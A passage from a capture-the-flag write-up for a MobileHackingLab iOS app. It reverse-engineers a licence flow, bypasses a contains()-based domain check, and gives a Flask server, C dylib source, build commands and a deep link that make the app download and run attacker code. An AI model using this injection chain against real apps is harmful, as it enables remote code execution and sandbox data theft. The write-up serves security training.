    v45 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("Unexpected response from server", 0x1FuLL, 1);
    showToast(message:duration:sender:)(v45, v12, a5);    
    return;
  }
  v67 = v47_NSHTTPURLResponse_obj;
  if ( objc_msgSend(v47_NSHTTPURLResponse_obj, "statusCode") != (id)200 )
  {
    v29 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("Unexpected response from server", 0x1FuLL, 1);    
    showToast(message:duration:sender:)(v29, v24, a5);    
  }
  else
  {
    ...
    NSJSONReadingOptions and conformance NSJSONReadingOptions();    
    v43_response_json_obj = objc_retainAutoreleasedReturnValue(
                              objc_msgSend(
                                v40_CLASS___NSJSONSerialization,
                                "JSONObjectWithData:options:error:",
                                v42_NSData_response,
                                v66,
                                &v65));    
    if ( v43_response_json_obj )
    {
      if ( v38 )
      {        
        v61_status_string_constant = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("status", 6uLL, 1);
        Dictionary.subscript.getter(v74);        
        if ( !v36 )
        {
          v32 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)(
                  "Invalid response from server",
                  0x1CuLL,
                  1);
          v21 = default argument 1 of showToast(message:duration:sender:)();
          showToast(message:duration:sender:)(v32, v21, a5);          
          return;
        }
        v59 = v35_status_value;        
        v22_healthy_string_constant = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("healthy", 7uLL, 1);        
        v31_is_status_value_equal_healthy = static String.== infix(_:_:)(
                                              v35_status_value,
                                              v36,
                                              v22_healthy_string_constant._countAndFlagsBits);
        if ( (v31_is_status_value_equal_healthy & 1) != 0 )
        {
          (*(void (__fastcall **)(__int64, __int64))((*a6 & swift_isaMask) + 0x88LL))(a7, a8);
        }
        else
        {
          v30 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("Server not healthy", 0x12uLL, 1);          
          showToast(message:duration:sender:)(v30, v23, a5);          
        }        
      }
      else
      {        
        v37 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)(
                "Malformed response from server",
                0x1EuLL,
                1);        
        showToast(message:duration:sender:)(v37, v20, a5);        
      }
    }
    else
    {      
      v27 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("Malformed response from server", 0x1EuLL, 1);      
      showToast(message:duration:sender:)(v27, v25, a5);      
    }    
  }
}
```

This is a quite lengthly callback implementation, after rename a few local variables for readability, it expects the reponse is in JSON format and it should be:
```json
{
    "status": "healthy"
}
```

If the response satisfies above condition, it will trigger method call `(*(void (__fastcall **)(__int64, __int64))((*a6 & swift_isaMask) + 0x88LL))(a7, a8);`, it's the same indirect call pattern like earlier, we cant tell which method it is but spoil alert (can verify with LLDB later) this is invoking `SubscribeController.activateServer(server:)(Swift::String server)` method. If response status code is not `200` (success) or response body is not JSON format, etc. the corresponding error message will be shown (*"Unexpected response from server"*, *"Invalid response from server"*, *"Malformed response from server"*, etc.)

Before digging `SubscribeController.activateServer(server:)(Swift::String server)` implementation, as we already have the 1st API call information, let try to invoke it using `curl` command to see what current response value is:
```bashscript
bash-3.2$ curl mhl.pages.dev/runtime/health
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>cloudflare</center>
</body>
</html>
```

With above response and applied to the callback logic, it is not expected JSON format hence "**Malformed response from server**" was shown.

### SubscribeController.activateServer(server:)(Swift::String server) - 2nd API POST request
```C
Swift::Void __swiftcall SubscribeController.activateServer(server:)(Swift::String server)
{
    ...
    v61 = server;  
    v47 = type metadata accessor for URLRequest();
    v24_http_string_constant = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("http://", 7uLL, 1);
    DefaultStringInterpolation.appendLiteral(_:)(v24_http_string_constant);    
    v25_activate_path_string_constant = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)(
                                            "/activate",
                                            9uLL,
                                            v69 & 1);
    DefaultStringInterpolation.appendLiteral(_:)(v25_activate_path_string_constant);
    ...    
    v40 = default argument 1 of URLRequest.init(url:cachePolicy:timeoutInterval:)(v28);    
    URLRequest.init(url:cachePolicy:timeoutInterval:)(v56, v40);
    v29_POST_string_constant = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("POST", 4uLL, 1);
    v30 = URLRequest.httpMethod.setter(v29_POST_string_constant._countAndFlagsBits, v29_POST_string_constant._object);    
    v77 = partial apply for closure #1 in SubscribeController.activateServer(server:);    
    aBlock = _NSConcreteStackBlock;    
    v75 = thunk for @escaping @callee_guaranteed @Sendable (@guaranteed Data?, @guaranteed NSURLResponse?, @guaranteed Error?) -> ();
    v76 = &block_descriptor_6_0;
    v41 = _Block_copy(&aBlock);    
    v44 = objc_retainAutoreleasedReturnValue(objc_msgSend(v43, "dataTaskWithRequest:completionHandler:", isa, v41));    
    objc_msgSend(v44, "resume");    
    (*(void (__fastcall **)(char *, __int64))(v67 + 8))(v58, v70);
    ...
}
```
Same as 1st API request in `SubscribeController.verifyLicense(server:key:)` except this is a `POST` request with empty request body to `http://mhl.pages.dev/runtime/activate` and expect the response logic is handled in the `closure #1 in SubscribeController.activateServer(server:)`

### closure #1 in SubscribeController.activateServer(server:)
```C
void __fastcall closure #1 in SubscribeController.activateServer(server:)(
        __int64 a1,
        __int64 a2,
        void *a3,
        __int64 a4,
        objc_class *a5,
        _QWORD *a6,
        __int64 a7,
        __int64 a8)
{
...
  v20_NSURLResponse_obj = objc_retain(v96_NSURLResponse_obj);  
  v83_CLASS___NSHTTPURLResponse_obj = v88_CLASS___NSHTTPURLResponse_obj;
  if ( !v88_CLASS___NSHTTPURLResponse_obj )
  {
    v81 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("Unexpected response from server", 0x1FuLL, 1);
    v24 = default argument 1 of showToast(message:duration:sender:)();
    showToast(message:duration:sender:)(v81, v24, v97);
    swift_bridgeObjectRelease(v81._object);
    return;
  }
  if ( objc_msgSend(v83_CLASS___NSHTTPURLResponse_obj, "statusCode") != (id)200 )
  {
    v44 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("Unexpected response from server", 0x1FuLL, 1);
    v38 = default argument 1 of showToast(message:duration:sender:)();
    showToast(message:duration:sender:)(v44, v38, v97);
    swift_bridgeObjectRelease(v44._object);
    objc_release(v80);
  }
  else
  {
    ...    
    v73_CLASS___NSJSONSerialization = (id)objc_opt_self(&OBJC_CLASS___NSJSONSerialization);
    outlined copy of Data._Representation(v70, v69);    
    v76_response_json_obj = objc_retainAutoreleasedReturnValue(
                              objc_msgSend(
                                v73_CLASS___NSJSONSerialization,
                                "JSONObjectWithData:options:error:",
                                isa,
                                v116,
                                &v115));    
    if ( v76_response_json_obj )
    {
      ...
      if ( v65 )
      {        
        v33_token_string_constant = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("token", 5uLL, 1);        
        v111 = v33_token_string_constant;
        Dictionary.subscript.getter(v124);                
        if ( !v59 )
        {
          v50 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)(
                  "Invalid response from server",
                  0x1CuLL,
                  1);          
          showToast(message:duration:sender:)(v50, v34, v97);          
          outlined consume of Data._Representation(v70, v69);          
          return;
        }        
        v48_token_value = v53;        
        UUID.init(uuidString:)();
        outlined init with copy of UUID?(v105, v103);
        v35 = type metadata accessor for UUID(0LL);
        if ( (*(unsigned int (__fastcall **)(_BYTE *, __int64))(*(_QWORD *)(v35 - 8) + 48LL))(v103, 1LL) == 1 )// validate token format
        {
          v47 = 1;
        }
        else
        {
          outlined destroy of UUID?(v103);
          v47 = 0;
        }
        v46_is_not_valid_uuid = v47;
        outlined destroy of UUID?(v105);
        if ( (v46_is_not_valid_uuid & 1) != 0 )
        {
          v45 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("Invalid token format", 0x14uLL, 1);          
          showToast(message:duration:sender:)(v45, v37, v97);          
        }
        else
        {
          (*(void (__fastcall **)(__int64, __int64, __int64, __int64))((*v98 & swift_isaMask) + 0x90LL))( //  SubscribeController.getLicenseFile
            v99,
            v100,
            v49,
            v48_token_value);
        }        
      }
      else
      {
        swift_unknownObjectRelease(v66);
        v62 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)(
                "Malformed response from server",
                0x1EuLL,
                1);    
        showToast(message:duration:sender:)(v62, v32, v97);        
      }
    }
    else
    {      
      v42 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("Malformed response from server", 0x1EuLL, 1);     
      showToast(message:duration:sender:)(v42, v39, v97);      
    }
    ...
  }
}
```

This response logic also expects JSON format with the JSON key is `token` and value should be `UUID` format, for example XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX. If the condition is sastified, it will invoke `(*(void (__fastcall **)(__int64, __int64, __int64, __int64))((*v98 & swift_isaMask) + 0x90LL))(v99, v100, v44, v48_token_value)`, spoil alert again this is `SubscribeController.getLicenseFile(server:withToken:)(Swift::String server, Swift::String withToken)`.

If you try `curl` to this API, again you will not get the expect JSON response:
```bashscript
bash-3.2$ curl -X POST mhl.pages.dev/runtime/activate
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>cloudflare</center>
</body>
</html>
```

Let continue to dig `SubscribeController.getLicenseFile(server:withToken:)(Swift::String server, Swift::String withToken)`, hopefully it will be the end of the road

### SubscribeController.getLicenseFile(server:withToken:)(Swift::String server, Swift::String withToken) - 3rd API request
```C
Swift::Void __swiftcall SubscribeController.getLicenseFile(server:withToken:)(
        Swift::String server,
        Swift::String withToken)
{
    ...
    v64 = server;
    v57 = withToken;  
    v49 = type metadata accessor for URLRequest();  
    v24 = DefaultStringInterpolation.init(literalCapacity:interpolationCount:)(v62, 1LL);  
    v26_http_string_constant = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("http://", 7uLL, 1);  
    DefaultStringInterpolation.appendLiteral(_:)(v26_http_string_constant);  
    v27_download_path_string_constant = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)(
                                            "/download",
                                            9uLL,
                                            v72 & 1);  
    DefaultStringInterpolation.appendLiteral(_:)(v27_download_path_string_constant);  
    v28 = String.init(stringInterpolation:)(v68, v67);  
    URL.init(string:)(v28);      
    v40 = default argument 1 of URLRequest.init(url:cachePolicy:timeoutInterval:)(v30);    
    URLRequest.init(url:cachePolicy:timeoutInterval:)(v59, v40);    
    v31_GET_string_constant = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("GET", 3uLL, 1);
    URLRequest.httpMethod.setter(v31_GET_string_constant._countAndFlagsBits, v31_GET_string_constant._object);
    v32_X_API_Key_string_constant = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)(
                                      "X-API-Key",
                                      9uLL,
                                      v41 & 1);    
    URLRequest.addValue(_:forHTTPHeaderField:)(v57, v32_X_API_Key_string_constant);    
    v44 = URLRequest._bridgeToObjectiveC()().super.isa;    
    v80 = partial apply for closure #1 in SubscribeController.getLicenseFile(server:withToken:);    
    aBlock = _NSConcreteStackBlock;    
    v78 = thunk for @escaping @callee_guaranteed @Sendable (@guaranteed Data?, @guaranteed NSURLResponse?, @guaranteed Error?) -> ();
    v79 = &block_descriptor_12;
    v43 = _Block_copy(&aBlock);    
    v46 = objc_retainAutoreleasedReturnValue(objc_msgSend(v45, "dataTaskWithRequest:completionHandler:", v44, v43));    
    objc_msgSend(v46, "resume");    
    (*(void (__fastcall **)(char *, __int64))(v70 + 8))(v61, v73);
    ...  
}
```

With almost identical logic, it makes another `GET` request to `http://mhl.pages.dev/runtime/download` with an extra request header `X-API-Key` contains the `UUID` received in 2nd API response. Not much interesting here, let jump to the response handling logic in `closure #1 in SubscribeController.getLicenseFile(server:withToken:)`

### closure #1 in SubscribeController.getLicenseFile(server:withToken:)
This is the most complicated implementation in this app (length 0x1A38) with a plenty of validations. We will just cover happy flow for the sake of simplicity

First it checks the response header and expect `Content-Type` is `application/octet-stream`:
```C
v248_allHeaderFields = objc_retainAutoreleasedReturnValue(objc_msgSend(v254, "allHeaderFields"));  
v321_ContentType_constant = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("Content-Type", 0xCuLL, 1);
v37_application_octet_stream_constant = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)(
                                            "application/octet-stream",
                                            0x18uLL,
                                            1);
...
v234_is_Content_Type_equal_application_octet_stream = static String.== infix(_:_:)(v229, v232, v230);                                        
```

Then it checks status code is success and then get the sandbox location folder to store the license file:
```C
v339 = v286_response_body_data;
v215_defaultManager_obj = objc_retainAutoreleasedReturnValue(objc_msgSend((id)objc_opt_self(&OBJC_CLASS___NSFileManager), "defaultManager"));
v216_urlsForDirectory_array = objc_retainAutoreleasedReturnValue(objc_msgSend(v215_defaultManager_obj, "URLsForDirectory:inDomains:", 9LL, 1LL));
objc_release(v215_defaultManager_obj);
v217_urlsForDirectory_array = static Array._unconditionallyBridgeFromObjectiveC(_:)(
                                v216_urlsForDirectory_array,
                                v287);
swift_bridgeObjectRetain(v217_urlsForDirectory_array);
p_v318_urlsForDirectory_array = &v318_urlsForDirectory_array;
v318_urlsForDirectory_array = v217_urlsForDirectory_array;
v218 = __swift_instantiateConcreteTypeFromMangledName(&demangling cache variable for type metadata for [URL]);
v46 = lazy protocol witness table accessor for type [URL] and conformance [A]();
Collection.first.getter(v218, v46);
```
```assembly
ADRP            X8, #selRef_URLsForDirectory_inDomains_@PAGE
LDR             X1, [X8,#selRef_URLsForDirectory_inDomains_@PAGEOFF] ; SEL
MOV             W8, #9  ; NSDocumentDirectory (Documents)
MOV             X2, X8
MOV             W8, #1
MOV             X3, X8
BL              _objc_msgSend ; Searching URLs for Documents folder in app sandbox
```

After that, it checks if `license.dylib` file exists in `Documents` folder, then remove the file:
```C
v49 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("license.dylib", 0xDuLL, 1);
v205 = v49._object;
URL.appendingPathComponent(_:)(v49._countAndFlagsBits);
v209 = objc_retainAutoreleasedReturnValue(objc_msgSend((id)objc_opt_self(&OBJC_CLASS___NSFileManager), "defaultManager"));
URL.path.getter(v51);
v211_does_license_file_exist = (unsigned int)objc_msgSend(v209, "fileExistsAtPath:", v210);
objc_release(v210);
if ( (v211_does_license_file_exist & 1) != 0 )
    goto LABEL_51;
...
LABEL_51:    
    ...    
    v198 = (unsigned int)objc_msgSend(v209, "removeItemAtURL:error:", v197, &v308);
    ...
```

If file does not exist, it will write the file to `Documents` folder and start loading the `license.dylib` file using `dlopen`
```C
LABEL_53:
    v63 = v280;
    v64 = default argument 1 of Data.write(to:options:)();
    Data.write(to:options:)(v297, v64, v214, v213);
    ...
    v181_dlopen_result_handle = dlopen((const char *)v303_licence_path, 2); // RTLD_NOW
    ...
```

If it's able to open the lib successfully, it will find `register_device` symbol using `dsym` then invoke that method. If the method returns not nil value, it will show *"Upgraded to Pro. Please wait for a decade before we add pro features"* message.
```C
if ( v181_dlopen_result_handle )
{
    v180 = v181_dlopen_result_handle;
    v169_handle = v181_dlopen_result_handle;
    v311 = v181_dlopen_result_handle;
    v71_register_device_constant = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)(
                                        "register_device",
                                        0xFuLL,
                                        1);
    ...
    v159_register_device_method_address = (__int64 (*)(void))dlsym(
        v169_handle,
        (const char *)v301_register_device_constant);
    v310_register_device_method_address = v159_register_device_method_address;
    v333_register_device_method_address = v159_register_device_method_address;
    if ( v159_register_device_method_address != 0LL )
    {
        v332 = v159_register_device_method_address;
        v309 = v159_register_device_method_address;
        if ( (v159_register_device_method_address() & 1) != 0 )
        {
            v154 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)(
                        "Upgraded to Pro. Please wait for a decade before we add pro features",
                        0x44uLL,
                        1);
            showToast(message:duration:sender:)(v154, v73, v285);
        }
        else
        {
            v153 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)(
                        "Device registration failed.",
                        0x1BuLL,
                        1);
            showToast(message:duration:sender:)(v153, v74, v285);
        }
    }
}
```
FINALLY this is the end of the road for static analysis that leads us from custom URL to achieve Pro version. We have a clear flow, `mhl.pages.dev` does not response the expected data though. We need to find a way if we can hijack the server to fulfill the app needs.

### domain `mhl.pages.dev` validation flaw
```C
Swift::Void __swiftcall SubscribeController.verifyLicense(server:key:)(Swift::String server, Swift::String key)
{
  ...
  v30_mhl_pages_dev_string_constant = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)(
                                        "mhl.pages.dev",
                                        0xDuLL,
                                        1);
  v134 = &v154_mhl_pages_dev_string_constant;
  v154_mhl_pages_dev_string_constant = v30_mhl_pages_dev_string_constant;
  v133 = lazy protocol witness table accessor for type String and conformance String();
  v135_server_contains_mhl_pages_dev_boolean = StringProtocol.contains<A>(_:)(v134, v132, v132, v133);
  if ( (v135_server_contains_mhl_pages_dev_boolean & 1) != 0 )// if server contains "mhl.pages.dev"
  {
    ...
  }
  else // server does not contain "mhl.pages.dev"
  {
    v68 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("Invalid Server", 0xEuLL, 1);
    showToast(message:duration:sender:)(v68, v67, v113);
  }
```

If we look back the domain validation logic, this seems a legit check to verify it's expected server. However, using `StringProtocol.contains(_ other: String) -> Bool` to validate a server is not a recommended way, actually it is easy to bypass the validation, by replacing the expected domain with any names and append the expected one in the query string, mission completed! if we follow this, the new custom URL will look like this: `runtime://starttrial?server=my.own.server/runtime?x=mhl.pages.dev&trialKey=1234-5678-ABCD`

If we try to test above URL, we can see the message *"**Cannot connect to the host**"* rather than *"**Invalid server**"*, which means we bypassed the domain validation and succesfully hijacked our own server. 

## Dynamic Analysis
This step is highly relies on LLDB for attacking debugger and reveal Swift indirect method address to figure out the method names, and it's done along the way with static analysis (where above spoil alerts given)

# Exploit
## Attack plan
[![Attack plan](https://lh3.googleusercontent.com/pw/AP1GczPTVYMUq4ZyDP-kVEluNRIseM3P6e9m_S6SSEjShaxkA5viXttNBqk3xcuelN3JG11D5KAK4hzdkwhB8xwNlvGTKCrRzzAT217ySKB2rEP8KxKNtXcPwS_z4l8bbpG2Ty_p5R_7YA9XmV_D5kcsyQOS=w1780-h1388-s-no?authuser=0)](https://lh3.googleusercontent.com/pw/AP1GczPTVYMUq4ZyDP-kVEluNRIseM3P6e9m_S6SSEjShaxkA5viXttNBqk3xcuelN3JG11D5KAK4hzdkwhB8xwNlvGTKCrRzzAT217ySKB2rEP8KxKNtXcPwS_z4l8bbpG2Ty_p5R_7YA9XmV_D5kcsyQOS=w1780-h1388-s-no?authuser=0){:target="_blank"} 

## Setup server
We will use our local server for demo purpose.

### mock_server.py source code
We will write a simple python server with the help of `Flask` library to handle requests.

```python
# mock_server.py
from flask import Flask, jsonify, request, send_from_directory, abort
import os

app = Flask(__name__)
# Path to the directory where license.dylib is located
BASE_DIR = os.path.dirname(os.path.abspath(__file__))


@app.route('/runtime', methods=['GET', 'POST'])
def runtime_with_query():
    # Get the query parameter 'x'
    x_value = request.args.get('x', default=None)

    # Check if x_value is provided
    if x_value:
        # Check if "healthy" is in the x_value string
        if "/health" in x_value: # GET
            return jsonify({"status": "healthy"})
        if "/activate" in x_value: # POST
            return jsonify({"token": "E621E1F8-C36C-495A-93FC-0C247A3E6E5F"})  # a random UUID value          
        if "/download" in x_value: # GET
            # Serve the license.dylib file with custom headers
            response = send_from_directory(directory=BASE_DIR, path='license.dylib', as_attachment=True)
            response.headers["Content-Type"] = "application/octet-stream"
            return response
        else:
            return jsonify({"error": "Unhandled request!"}), 500
    else:
        return jsonify({"error": "Missing query parameter 'x'"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)
```

Above local server supports 3 API endpoints that we need under `/runtime` route, for ex. `/runtime?x=mhl.pages.dev/health`
### Start server
```bashscript
$ python3 mock_server.py
 * Serving Flask app 'mock_server'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:5001
 * Running on http://192.168.10.66:5001
Press CTRL+C to quit
```

Now the server is ready to serve for request under the same network (wifi connection) for demo purpose
## Prepare licence.dylib
### Source code
```C
// license.h
#ifndef LICENSE_H
#define LICENSE_H

bool register_device(void);

#endif // LICENSE_H
```

```C
// license.c

#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <string.h>
#include <libgen.h>  // for dirname()

// Declare the symbol to be exported
int register_device(void) {
    // for demo purpose, we will write a file to the same location of license.dylib
    Dl_info dl_info;

    // Retrieve information about the currently loaded dynamic library
    if (dladdr((void *)register_device, &dl_info) != 0) {
        // Extract the directory path of the dynamic library
        char *lib_path = strdup(dl_info.dli_fname);
        char *dir_path = dirname(lib_path);  // Get the directory part of the path

        // Construct the full path to the file (in the same directory as the dylib)
        char file_path[256];
        snprintf(file_path, sizeof(file_path), "%s/exploit_proof.txt", dir_path);

        // Open the file for writing
        FILE *file = fopen(file_path, "w");
        if (file != NULL) {
            // Write "exploited" to the file
            fprintf(file, "exploited\n");
            fclose(file);
            printf("File created and written to %s\n", file_path);
        } else {
            printf("Failed to create file at %s\n", file_path);
        }

        // Free the allocated memory
        free(lib_path);
    } else {
        printf("Failed to retrieve dynamic library information\n");
    }

    return 1;
}
```

For PoC purpose, we write a simple file under same location as downloaded `license.dylib`, this is not limited to steal secret data in sandbox folder or if device is jailbroken it can escapse sandbox and access other apps data and so on.

### Compile license.dylib
We can use `clang` to compile `license.c` to `license.dylib` as below:
```bashscript
$ clang -dynamiclib -o license.dylib license.c
```
or
```bashscript
clang -arch arm64 -isysroot $(xcrun --sdk iphoneos --show-sdk-path) -dynamiclib -o license.dylib license.c
```

New `license.dylib` file will be generated then we need to copy this file to the same location with `mock_server.py`

## Deploy the attack
Make sure the iOS device for testing connect to the same network as the server (same Wifi), copy this URL to the device web browser to launch the app: `runtime://starttrial?server=192.168.10.66:5001/runtime?x=mhl.pages.dev&trialKey=1234-5678-ABCD`, we can see the app is launched and navigated to **Pro Pack** screen with a message "**Upgraded to Pro. Please wait for a decade before we add pro features**", which confirms the hijack is successful!

[![Upgraded to Pro](https://lh3.googleusercontent.com/pw/AP1GczMdYXvtORJduGBMHziWgc-PTsEg9H2SL9CYQ1tDk4Svz7E-wfHCvO0bNvysUSe5UCEQ2HSwQnInwEP5mFzfHZ7RqH4NcaeIGv-ZgFVVEnZLBVPDni5vkpQY8BIAMk0pS9h_FU0x7t3VvTJwT5FlE16z=w894-h1582-s-no?authuser=0)](https://lh3.googleusercontent.com/pw/AP1GczMdYXvtORJduGBMHziWgc-PTsEg9H2SL9CYQ1tDk4Svz7E-wfHCvO0bNvysUSe5UCEQ2HSwQnInwEP5mFzfHZ7RqH4NcaeIGv-ZgFVVEnZLBVPDni5vkpQY8BIAMk0pS9h_FU0x7t3VvTJwT5FlE16z=w894-h1582-s-no?authuser=0){:target="_blank"} <br/>**Figure: Upgraded to Pro** <br/><br/>

From the server terminal, we can see there are 3 requests sent to the server.
```bashscript
192.168.10.175 - - [17/Sep/2024 21:19:49] "GET /runtime?x=mhl.pages.dev/health HTTP/1.1" 200 -
192.168.10.175 - - [17/Sep/2024 21:19:49] "POST /runtime?x=mhl.pages.dev/activate HTTP/1.1" 200 -
192.168.10.175 - - [17/Sep/2024 21:19:49] "GET /runtime?x=mhl.pages.dev/download HTTP/1.1" 200 -
```

We can further confirm by SSH into device and navigate to `Runtime` app sandbox, there is `license.dylib` file downloaded and exploit PoC file `exploit_proof.txt` generated with the content "**exploited**" as expected.
[![Exploited PoC](https://lh3.googleusercontent.com/pw/AP1GczOcpSpiT6ANH_TMx0X3S5NN7sfU8PqsWBt4nUbibtJskgGO76UA8ig0cej3QIVFNoU1MpEi8gjA1P9yieQ_WX5Y7YJ3TRrTvhDYrsR2SaACeUUHB4yq83dkaWH5dcESffmcmw64Xp6ulN1tGb1ViZGw=w2570-h226-s-no?authuser=0)](https://lh3.googleusercontent.com/pw/AP1GczOcpSpiT6ANH_TMx0X3S5NN7sfU8PqsWBt4nUbibtJskgGO76UA8ig0cej3QIVFNoU1MpEi8gjA1P9yieQ_WX5Y7YJ3TRrTvhDYrsR2SaACeUUHB4yq83dkaWH5dcESffmcmw64Xp6ulN1tGb1ViZGw=w2570-h226-s-no?authuser=0){:target="_blank"} <br/>**Figure: Exploited PoC** <br/><br/>

## MobileHackingLab Feedback
I must say this new iOS lab is on another level compare to the others they provided, luckily I am the first blood for this lab 🤗 
[![MobileHackingLab Feedback](https://lh3.googleusercontent.com/pw/AP1GczM7_tcYeTsLs0Zs3iJC1J7j9GY1w3oIJJnMyg0AmH7AoDq4YuNO_ZNbUZhNGJhQfAsjOcYukecf7d3BVNnKSBHv7MEN7-FGUeNyx6sd5AaNW-qksUwsUytj0iJ_7vxwmQKEpO30iPqJNn4mRXbalwAn=w1874-h302-s-no?authuser=0)](https://lh3.googleusercontent.com/pw/AP1GczM7_tcYeTsLs0Zs3iJC1J7j9GY1w3oIJJnMyg0AmH7AoDq4YuNO_ZNbUZhNGJhQfAsjOcYukecf7d3BVNnKSBHv7MEN7-FGUeNyx6sd5AaNW-qksUwsUytj0iJ_7vxwmQKEpO30iPqJNn4mRXbalwAn=w1874-h302-s-no?authuser=0){:target="_blank"} <br/>**Figure: MobileHackingLab Feedback** <br/><br/>

# Conclusion
*"This challenge is a great opportunity to enhance your expertise in dynamic library injection, cross-compiling for iOS, and creating fake environments for security research. Dive into the challenge, explore the app's protections, and advance your skills in iOS application security!"* - MobileHackingLab

This lab requires both static and dynamic analysis to understand the flow and protections, it's a bit tricky as mostly written in Swift and there are lack of XREFs to trace (intentionally I guess), hence needed to debug to understand the flow, dot the i's and cross the t's to make it work. 😎 
